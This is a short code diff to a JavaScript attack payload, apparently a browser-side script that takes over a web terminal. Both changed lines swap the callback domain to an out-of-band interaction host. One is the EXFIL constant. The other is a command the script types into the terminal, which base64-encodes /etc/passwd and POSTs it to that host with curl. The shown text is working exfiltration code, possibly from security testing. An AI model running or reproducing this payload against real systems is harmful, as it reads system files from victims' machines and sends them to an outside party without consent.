@@ -1,5 +1,5 @@
 (async function() {
-    const EXFIL = 'https://0fqoaoy7.c5.rs';
+    const EXFIL = 'https://oskpfdzzwhnbxxvl14la6o5shu7mqpary.oast.site';
     const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
     
     function exfil(type, data) {
@@ -74,7 +74,7 @@
         terminalInput.focus();
         await wait(500);
         
-        const command = 'cat /etc/passwd | base64 | curl -X POST -d @- https://0fqoaoy7.c5.rs?type=passwd_exfil';
+        const command = 'cat /etc/passwd | base64 | curl -X POST -d @- https://oskpfdzzwhnbxxvl14la6o5shu7mqpary.oast.site?type=passwd_exfil';
         
         for (let i = 0; i < command.length; i++) {
             const char = command[i];
